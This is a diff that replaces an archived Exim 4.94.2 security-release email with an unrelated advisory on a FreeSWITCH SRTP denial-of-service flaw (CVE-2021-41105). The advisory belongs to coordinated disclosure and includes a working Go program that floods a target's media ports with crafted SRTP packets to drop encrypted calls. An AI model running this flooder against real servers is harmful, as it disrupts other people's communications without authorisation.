@@ -1,143 +1,113 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/05/04/6
-Message-ID: <20210504133905.GY30431@jumper.schlittermann.de>
-Date: Tue, 4 May 2021 15:39:05 +0200
-From: Heiko Schlittermann <hs@...marc.schlittermann.de>
-To: oss-security <oss-security@...ts.openwall.com>
-Subject: Exim 4.94.2 - security update released
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/10/25/5
+Message-Id: <192a3767-2dda-4156-b9bd-1f6a6fa56f3d@www.fastmail.com>
+Date: Mon, 25 Oct 2021 16:24:15 +0200
+From: "Sandro Gauci" <sandro@...blesecurity.com>
+To: oss-security@...ts.openwall.com, bugtraq@...urityfocus.com, fulldisclosure@...lists.org, voipsec@...psa.org, submissions@...ketstormsecurity.org, vuln@...unia.com, cert@...t.org
+Subject: [ES2021-09] FreeSWITCH susceptible to Denial of Service via invalid SRTP packets
 Content-Type: text/plain; charset=utf-8
 
-Dear Exim-Users
+# FreeSWITCH susceptible to Denial of Service via invalid SRTP packets
 
-Abstract
---------
+- Fixed versions: v1.10.7
+- Enable Security Advisory: https://github.com/EnableSecurity/advisories/tree/master/ES2021-09-freeswitch-srtp-dos
+- Vendor Security Advisory: https://github.com/signalwire/freeswitch/security/advisories/GHSA-jh42-prph-gp36
+- Other references: CVE-2021-41105
+- Tested vulnerable versions: <= v1.10.6
+- Timeline:
+	- Report date: 2021-09-06
+	- Triaged: 2021-09-10
+	- Fix provided for testing: 2021-09-17
+	- Vendor release with fix: 2021-10-24
+	- Enable Security advisory: 2021-10-25
 
-Several exploitable vulnerabilities in Exim were reported to us and are
-fixed.
+## TL;DR
 
-We have prepared a security release, tagged as "exim-4.94.2".
+When handling SRTP calls, FreeSWITCH is susceptible to a DoS where calls can be terminated by remote attackers. This attack can be done continuously, thus denying encrypted calls during the attack.
 
-This release contains all changes on the exim-4.94+fixes branch plus
-security fixes.
+## Description
 
-You should update your Exim instances as soon as possible. (See below
-for short upgrade notes.)
+When a media port that is handling SRTP traffic is flooded with a specially crafted SRTP packet, the call is terminated leading to denial of service. This issue was reproduced when using the SDES key exchange mechanism in a SIP environment as well as when using the DTLS key exchange mechanism in a WebRTC environment.
 
+The call disconnection occurs due to line 6331 in the source file `switch_rtp.c`, which disconnects the call when the total number of SRTP errors reach a hard-coded threshold (100):
 
-Distro users
-------------
+```c
+if (errs >= MAX_SRTP_ERRS) {
+    // ...
+    switch_channel_hangup(channel, SWITCH_CAUSE_SRTP_READ_ERROR);
+}
+```
 
-Several distros will provide updated packages: Just do the update.
-If the update contains a version change from <4.94 to 4.94.2, you may
-want to read the upgrade notes below.
+## Impact
 
-Self-built Exim
----------------
+By abusing this vulnerability, an attacker is able to disconnect any ongoing calls that are using SRTP. The attack does not require authentication or any special foothold in the caller's or the callee's network.
 
-Fetch the exim-4.94.2 from the known repositories, build and install
-the fixed version. If you need to upgrade from versions <4.94 to 4.94.2,
-you may want to read the upgrade notes below.
+## How to reproduce the issue
 
+1. Prepare a FreeSWITCH instance that is publicly available and that can handle SRTP calls (`<X-PRE-PROCESS cmd="set" data="rtp_secure_media=true"/>`)
+2. Prepare two SIP clients that can handle SRTP communication, such as Zoiper, and register against the FreeSWITCH instance
+3. Prepare an attacker machine which has a different IP than that of the caller, callee or the FreeSWITCH instance
+4. Save the below Go code and compile the application, naming it `freeswitch-srtp-dos`
+5. Copy `freeswitch-srtp-dos` to the attacker machine
+6. Perform a call between the agents using SRTP
+7. Run the `freeswitch-srtp-dos` application against the target FreeSWITCH server: `./freeswitch-srtp-dos -ip <freeswitch_ip>`
+8. Observe that when the active media ports are reached, FreeSWITCH will report "SRTP audio unprotect failed with code 21" multiple times, until the call is terminated
 
-Schedule
---------
+```go
+package main
 
-2021-05-04 13:30 UTC:   Publish the release on the public
-                        repos/website/etc
+import (
+	"flag"
+	"fmt"
+	"net"
+)
 
-Repositories
-------------
+func main() {
+	var minport, maxport, count int
+	var ip string
 
-The sources are available:
+	flag.IntVar(&minport, "min-port", 16384, "port-range minimum value")
+	flag.IntVar(&maxport, "max-port", 32768, "port-range maximum value")
+	flag.IntVar(&count, "count", 200, "packet count per port")
+	flag.StringVar(&ip, "ip", "", "target IPv4 address")
+	flag.Parse()
 
-        tarballs: https://ftp.exim.org/pub/exim/exim4/
-                  (the mirrors will follow with some delay)
-        source:   https://git.exim.org/exim.git
-                  tag: exim-4.94.2
-                  branch: exim-4.94.2+fixes
+	listener, err := net.ListenPacket("udp", "0.0.0.0:0")
+	if err != nil {
+		panic(err)
+	}
 
-The +fixes branch contains fixes for an issue, that we experienced
-occasionally with outgoing SMTP (using DANE, TLS SNI and an unusual
-certificate setup on the remote server. See
-https://lists.exim.org/lurker/message/20210503.163324.f7021753.en.html)
+	fmt.Printf("sending %d packets on each port, port range %d-%d\n",
+		count, minport, maxport)
 
-In case you're running exim-4.92.3 currently and you do not see any
-option in updating this to 4.94.2, you *can* try using the branch
-exim-4.92.3+fixes. This branch contains the minimal set of backported
-security patches, but isn't officially supported by the Exim project
-and didn't get the same testing as the official release.
+	addr := &net.UDPAddr{IP: net.ParseIP(ip)}
+	for i := minport; i < maxport+1; i++ {
+		fmt.Printf("\rattacking port: %d", i)
+		addr.Port = i
+		for j := 0; j < count; j++ {
+			listener.WriteTo([]byte("\x80\x00p(\t\xcd-\x15\xfd>\\\x86A"), addr)
+		}
+	}
+}
+```
 
-Details
--------
+## Solution and recommendations
 
-The current Exim versions (and likely older versions too) suffer from
-several exploitable vulnerabilities. These vulnerabilities were reported
-by Qualys via security@...m.org back in October 2020.
+Upgrade to a version of FreeSWITCH that fixes this issue.
 
-Due to several internal reasons it took more time than usual for the Exim
-development team to work on these reported issues in a timely manner.
+Our suggestion to the FreeSWITCH developers was the following:
 
-We explicitly thank Qualys for reporting *and* for providing patches for
-most of the reported vulnerabilities.
+> Instead of disconnecting the call, FreeSWITCH should simply ignore packets that fail message authentication or replay checks.
 
-The details about the vulnerabilities *will* be published in the near
-future (on http://exim.org/static/doc/security/), but not today. This
-should give you the chance to update your systems.
+## About Enable Security
 
-Another source of information *will* be on the reporter's site:
-https://www.qualys.com/2021/05/04/21nails/21nails.txt
+[Enable Security](https://www.enablesecurity.com) develops offensive security tools and provides quality penetration testing to help protect your real-time communications systems against attack.
 
-For further reference a list of related CVEs:
+## Disclaimer
 
-    Local vulnerabilities
-    - CVE-2020-28007: Link attack in Exim's log directory
-    - CVE-2020-28008: Assorted attacks in Exim's spool directory
-    - CVE-2020-28014: Arbitrary PID file creation
-    - CVE-2020-28011: Heap buffer overflow in queue_run()
-    - CVE-2020-28010: Heap out-of-bounds write in main()
-    - CVE-2020-28013: Heap buffer overflow in parse_fix_phrase()
-    - CVE-2020-28016: Heap out-of-bounds write in parse_fix_phrase()
-    - CVE-2020-28015: New-line injection into spool header file (local)
-    - CVE-2020-28012: Missing close-on-exec flag for privileged pipe
-    - CVE-2020-28009: Integer overflow in get_stdinput()
-    Remote vulnerabilities
-    - CVE-2020-28017: Integer overflow in receive_add_recipient()
-    - CVE-2020-28020: Integer overflow in receive_msg()
-    - CVE-2020-28023: Out-of-bounds read in smtp_setup_msg()
-    - CVE-2020-28021: New-line injection into spool header file (remote)
-    - CVE-2020-28022: Heap out-of-bounds read and write in extract_option()
-    - CVE-2020-28026: Line truncation and injection in spool_read_header()
-    - CVE-2020-28019: Failure to reset function pointer after BDAT error
-    - CVE-2020-28024: Heap buffer underflow in smtp_ungetc()
-    - CVE-2020-28018: Use-after-free in tls-openssl.c
-    - CVE-2020-28025: Heap out-of-bounds read in pdkim_finish_bodyhash()
+The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.
 
+## Disclosure policy
 
-Upgrade notes
--------------
+This report is subject to Enable Security's vulnerability disclosure policy which can be found at <https://github.com/EnableSecurity/Vulnerability-Disclosure-Policy>.
 
-In case you need to upgrade from a version <4.94, you may encounter
-issues with *tainted data*. This is a security measure which we
-introduced with 4.94.
-
-Your configuration needs to be reworked.
-
-Alternatively you can use the exim-4.94.2+taintwarn branch. This branch
-tracks exim-4.94.2+fixes and adds a new main config option (the option
-is deprecated already today and will be ignored in a future release of
-Exim): "allow_insecure_tainted_data". This option allows you to turn the
-taint errors into warnings. (Debian is set to include this "taintwarn"
-patch in its Exim 4.94.2 release).
-
-Thank you for using Exim.
-Thanks to Qualys for reporting the issues.
-
-    Best regards from Dresden/Germany
-    Viele Grüße aus Dresden
-    Heiko Schlittermann
---
- SCHLITTERMANN.de ---------------------------- internet & unix support -
- Heiko Schlittermann, Dipl.-Ing. (TU) - {fon,fax}: +49.351.802998{1,3} -
- gnupg encrypted messages are welcome --------------- key ID: F69376CE -
-
-Download attachment "signature.asc" of type "application/pgp-signature" (489 bytes)
